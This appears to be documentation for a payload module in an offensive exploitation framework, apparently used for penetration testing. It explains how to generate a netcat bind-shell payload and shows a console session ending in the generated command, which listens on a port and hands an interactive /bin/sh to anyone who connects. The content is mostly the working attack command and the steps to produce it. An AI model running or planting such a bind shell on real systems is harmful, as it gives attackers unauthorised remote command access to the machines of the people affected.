## Description

Module generates payload that creates interactive tcp bind shell by using netcat one-liner. 

## Verification Steps

  1. Start `./rxf.py`
  2. Do: `use payloads/cmd/netcat_bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates netcat tcp bind shell payload.

## Scenarios

```
rxf > use payloads/cmd/netcat_bind_tcp
rxf (Netcat Bind TCP) > set rport 4321
[+] rport => 4321
rxf (Netcat Bind TCP) > run
[*] Running module...
[*] Generating payload
nc -lvp 4321 -e /bin/sh
```
